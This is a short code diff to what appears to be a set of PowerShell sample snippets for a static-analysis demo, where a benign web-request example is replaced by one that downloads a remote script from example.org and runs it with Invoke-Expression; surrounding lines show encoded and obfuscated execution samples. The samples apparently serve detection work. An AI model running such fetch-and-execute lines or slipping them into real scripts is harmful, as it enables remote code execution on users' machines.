@@ -129,12 +129,11 @@ function Invoke-NsgEncodedDemo {
     Invoke-Expression $decoded
 }`,
 
-        webrequest: `# Web request demo
-# This demonstrates a web request pattern without executing downloaded content.
-$url = "https://example.com"
-$response = Invoke-WebRequest -Uri $url -UseBasicParsing
+        webrequest: `# Remote content flows into dynamic execution.
+# Static-analysis demo only. Do not execute.
 
-Write-Host "Status code: $($response.StatusCode)"`,
+$payload = Invoke-RestMethod -Uri 'https://example.org/sample.ps1'
+Invoke-Expression $payload`,
 
         obfuscation: `# Obfuscation-style demo
 $O0O0O0 = -join ([char[]](87,114,105,116,101))
